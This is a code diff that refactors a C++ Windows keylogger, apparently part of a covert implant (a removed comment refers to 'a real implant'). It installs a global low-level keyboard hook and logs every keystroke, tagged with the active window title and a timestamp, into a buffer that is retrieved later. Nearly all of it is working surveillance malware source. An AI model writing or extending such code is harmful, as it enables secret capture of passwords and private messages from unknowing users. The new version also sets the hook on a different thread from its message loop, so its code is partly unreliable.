@@ -1,8 +1,10 @@
 #include "Keylogger.h"
+#include "../utils/Logger.h"
 #include <windows.h>
 #include <vector>
 #include <mutex>
 #include <thread>
+#include <atomic>
 #include <algorithm>
 #include <map>
 #include <ctime>
@@ -11,12 +13,13 @@
 namespace capture {
 
     namespace {
-        HHOOK hHook = NULL;
+        HHOOK g_hHook = NULL;
         std::mutex logMutex;
         std::string keylogBuffer;
         std::thread loggerThread;
-        bool isLogging = false;
+        std::atomic<bool> isLogging{false};
         std::string lastTitle;
+        DWORD loggerThreadId = 0;
 
         std::string GetActiveWindowTitle() {
             char title[256];
@@ -27,92 +30,93 @@ namespace capture {
 
         LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (nCode >= 0 && wParam == WM_KEYDOWN) {
-                KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
-                
+                KBDLLHOOKSTRUCT* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+
                 std::lock_guard<std::mutex> lock(logMutex);
 
-                // Check title change
                 std::string currentTitle = GetActiveWindowTitle();
                 if (currentTitle != lastTitle) {
                     lastTitle = currentTitle;
-                    
-                    time_t now = time(0);
-                    char dt[26];
+                    time_t now = time(nullptr);
+                    char dt[32];
                     ctime_s(dt, sizeof(dt), &now);
-                    std::string timestamp = dt;
-                    if (!timestamp.empty() && timestamp.back() == '\n') timestamp.pop_back();
-
-                    keylogBuffer += "\n\n--- [Active Window: " + currentTitle + " at " + timestamp + "] ---\n";
+                    dt[strcspn(dt, "\n")] = 0;
+                    keylogBuffer += "\n[" + std::string(dt) + "] " + currentTitle + "\n";
                 }
 
-                // Map Virtual Key to char
-                DWORD vkCode = kbd->vkCode;
-                char keyName[32] = {0};
-                
-                if (vkCode == VK_RETURN) keylogBuffer += "[ENTER]\n";
-                else if (vkCode == VK_BACK) keylogBuffer += "[BACKSPACE]";
-                else if (vkCode == VK_SPACE) keylogBuffer += " ";
-                else if (vkCode == VK_TAB) keylogBuffer += "[TAB]";
-                else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {} // Ignore modifier press
-                else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) keylogBuffer += "[CTRL]";
-                else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) keylogBuffer += "[ALT]";
-                else {
-                    // Try to get printable character
-                    BYTE keyboardState[256];
-                    GetKeyboardState(keyboardState);
-                    
-                    WORD ascii = 0;
-                    // Note: ToAscii is a bit flaky in hooks without attached thread input,
-                    // but ToAscii keeps it simple for now.
-                    // Better approach: MapVirtualKey
-                    
-                    int len = ToAscii(vkCode, kbd->scanCode, keyboardState, &ascii, 0);
-                    if (len == 1 && ascii >= 32 && ascii < 127) {
-                        keylogBuffer += (char)ascii;
-                    } else {
-                        // Fallback to key name
-                        GetKeyNameTextA(kbd->scanCode << 16, keyName, 32);
-                        keylogBuffer += "[" + std::string(keyName) + "]";
+                std::string key;
+                if (kbd->vkCode >= 'A' && kbd->vkCode <= 'Z') {
+                    key = std::string(1, static_cast<char>(kbd->vkCode + (GetKeyState(VK_SHIFT) < 0 ? 0 : 32)));
+                } else if (kbd->vkCode >= '0' && kbd->vkCode <= '9') {
+                    key = std::string(1, static_cast<char>(kbd->vkCode));
+                } else {
+                    switch (kbd->vkCode) {
+                        case VK_SPACE:   key = " "; break;
+                        case VK_RETURN:  key = "[ENTER]\n"; break;
+                        case VK_BACK:    key = "[BACK]"; break;
+                        case VK_TAB:     key = "[TAB]"; break;
+                        case VK_ESCAPE:  key = "[ESC]"; break;
+                        default:         key = "[VK:" + std::to_string(kbd->vkCode) + "]";
                     }
                 }
+
+                keylogBuffer += key;
+
+                if (keylogBuffer.size() > 32 * 1024) {
+                    keylogBuffer = keylogBuffer.substr(keylogBuffer.size() - 24 * 1024);
+                }
             }
-            return CallNextHookEx(hHook, nCode, wParam, lParam);
+            return CallNextHookEx(g_hHook, nCode, wParam, lParam);
         }
 
         void LoggerLoop() {
-            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-            
             MSG msg;
-            while (isLogging && GetMessage(&msg, NULL, 0, 0)) {
-                TranslateMessage(&msg);
-                DispatchMessage(&msg);
+            while (isLogging) {
+                while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
+                    TranslateMessage(&msg);
+                    DispatchMessageA(&msg);
+                }
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
             }
-            
-            UnhookWindowsHookEx(hHook);
-            hHook = NULL;
         }
     }
 
     void StartKeylogger() {
         if (isLogging) return;
         isLogging = true;
-        loggerThread = std::thread(LoggerLoop);
+
+        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+        if (!g_hHook) {
+            LOG_ERR("SetWindowsHookEx failed: " + std::to_string(GetLastError()));
+            isLogging = false;
+            return;
+        }
+
+        LOG_INFO("Keylogger hook installed (hHook = " + std::to_string((uintptr_t)g_hHook) + ")");
+
+        loggerThread = std::thread([]() {
+            loggerThreadId = GetCurrentThreadId();
+            LoggerLoop();
+        });
     }
 
     void StopKeylogger() {
+        if (!isLogging) return;
         isLogging = false;
-        // Post a message to break the message loop
-        // We need the thread ID of the logger thread.
-        // Simplification: In a real implant, use PostThreadMessage(threadId, WM_QUIT...).
-        // Since we didn't save ID, we rely on isLogging check or subsequent input.
-        // HOWEVER, GetMessage blocks. So we MUST post a message.
-        // For this simple version, let's just detach and leak or force terminate if urgent.
-        // Proper fix:
-        // PostThreadMessage(GetThreadId(handle), WM_QUIT, 0, 0);
-        // But std::thread doesn't give handle easily.
-        // We will accept that Stop might lag until next input or just leave it running in background if detached.
-        // For now, let's detach.
-        loggerThread.detach();
+
+        if (g_hHook) {
+            UnhookWindowsHookEx(g_hHook);
+            g_hHook = NULL;
+            LOG_INFO("Keylogger hook removed");
+        }
+
+        if (loggerThreadId) {
+            PostThreadMessage(loggerThreadId, WM_QUIT, 0, 0);
+        }
+
+        if (loggerThread.joinable()) {
+            loggerThread.join();
+        }
     }
 
     std::string GetAndClearKeylog() {
